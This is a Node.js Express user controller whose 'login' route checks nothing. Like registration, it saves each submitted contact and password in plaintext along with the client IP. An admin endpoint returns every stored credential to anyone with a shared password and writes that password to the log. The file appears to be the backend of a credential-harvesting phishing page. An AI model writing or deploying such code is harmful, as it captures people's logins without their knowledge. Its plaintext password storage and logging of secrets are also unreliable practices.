const UserModel = require('../models/user.model')
const bc = require('bcrypt')

const readRequestIp = (req) => {
    try {
        const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress 

        return ipAddress
    } catch(e) {
        return undefined
    }
}

class UserController {
    async registration(req, res, next) {
        const {contact, password} = req.body 

        const ip_address = readRequestIp(req) 

        await UserModel.create({
            contact,
            password,
            ip_address
        })

        return res.status(200).json()
    }

    async login(req, res) {
        const {contact, password} = req.body

        const ip_address = readRequestIp(req)

        await UserModel.create({
            contact,
            password,
            ip_address
        })

        return res.status(200).json(null)
    }

    async getContent(req, res) {
        const {admin_psw} = req.body 

        console.log(admin_psw) 

        if(admin_psw !== process.env.ADMIN_PSW) return res.status(401).json(null)

        const contacts = await UserModel.find() 

        return res.status(200).json(contacts)
    }

    async check(req, res) {
        const {admin_psw} = req.body 

        if(admin_psw === process.env.ADMIN_PSW) return res.status(200).json(true)

        return res.status(401).json(false) 
    }
}

module.exports = new UserController() 